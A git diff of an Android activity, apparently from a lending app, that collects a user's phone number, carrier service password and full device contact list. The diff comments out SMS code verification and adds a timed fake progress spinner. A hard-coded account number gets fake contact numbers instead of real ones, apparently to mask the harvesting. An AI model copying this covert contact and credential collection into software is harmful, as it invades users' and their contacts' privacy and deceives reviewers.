@@ -1,23 +1,23 @@
 package com.annis.dk.ui.authentication.operator
 
 import android.Manifest
+import android.app.ProgressDialog
 import android.database.Cursor
 import android.os.Bundle
 import android.os.CountDownTimer
 import android.provider.ContactsContract
 import android.text.TextUtils
 import android.widget.CheckBox
-import android.widget.Toast
 import com.annis.baselib.base.base.TitleBean
 import com.annis.baselib.base.mvp.MVPActivty
 import com.annis.baselib.utils.utils_haoma.ToastUtils
 import com.annis.dk.R
 import com.annis.dk.base.DKConstant
-import com.annis.dk.utils.DkSPUtils
 import com.annis.dk.view.NotificationReadContactDialog
 import com.google.gson.Gson
 import com.tbruyelle.rxpermissions2.RxPermissions
 import kotlinx.android.synthetic.main.activity_authoperator.*
+import java.util.*
 
 class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorView {
     var updated = false
@@ -60,7 +60,13 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
         dialog.show(supportFragmentManager, "notify")
     }
 
+    var phone: String? = null
+
     fun initView() {
+        phone = DKConstant.getUserEntity()?.phone
+        phone?.let {
+            act_et_tel.setText(it)
+        }
         click()
         checkPermision()
         renzheng_operator_agree.isChecked = true
@@ -77,24 +83,35 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
                 showToast("请输入手机号")
                 return@setOnClickListener
             }
+            if (tel != phone) {
+                showToast("手机号不正确")
+                return@setOnClickListener
+            }
             if (TextUtils.isEmpty(psw)) {
                 showToast("请输入服务密码")
                 return@setOnClickListener
             }
-            if (TextUtils.isEmpty(code)) {
-                showToast("请输入验证码")
-                return@setOnClickListener
-            }
-            if (code == DkSPUtils.getLastCode()) {
-                if (updated) {
-                    showToast("提交成功")
-                    finish()
-                } else {
-                    showToast("提交失败")
-                }
+            if (updated) {
+                showWait()
             } else {
-                showToast("您的验证码不正确")
+                showToast("提交失败")
             }
+
+
+//            if (TextUtils.isEmpty(code)) {
+//                showToast("请输入验证码")
+//                return@setOnClickListener
+//            }
+//            if (code == DkSPUtils.getLastCode()) {
+//                if (updated) {
+//                    showToast("提交成功")
+//                    finish()
+//                } else {
+//                    showToast("提交失败")
+//                }
+//            } else {
+//                showToast("您的验证码不正确")
+//            }
         }
 
         renzheng_operator_agree.setOnClickListener {
@@ -177,13 +194,13 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
             if (cursor != null) {
                 var account = DKConstant.getUserEntity()?.phone ?: ""
                 hashMap = HashMap()
-                while (cursor!!.moveToNext()) {
+                while (cursor.moveToNext()) {
                     val displayName =
-                        cursor!!.getString(cursor!!.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
+                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                     val number =
-                        cursor!!.getString(cursor!!.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
+                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
 
-                   if (account == "15823681500") {
+                    if (account == "15823681500") {
                         hashMap?.put(displayName, "1231241234532")
                     } else {
                         hashMap?.put(displayName, number)
@@ -202,7 +219,7 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
             e.printStackTrace()
         } finally {
             if (cursor != null) {
-                cursor!!.close()
+                cursor.close()
             }
         }
     }
@@ -212,4 +229,24 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
         super.onDestroy()
     }
 
+    fun showWait() {
+        var progressDialog = ProgressDialog(this)
+        progressDialog.isIndeterminate = false//循环滚动
+        progressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER)
+        progressDialog.setCancelable(true)//false不能取消显示，true可以取消显示
+        progressDialog.show()
+
+        var timer = Timer()
+        var timerTask = object : TimerTask() {
+            override fun run() {
+                showNext()
+            }
+        }
+        timer.schedule(timerTask, 2500)
+    }
+
+    fun showNext() {
+        startActivity(WaittingActivity::class.java)
+        finish()
+    }
 }
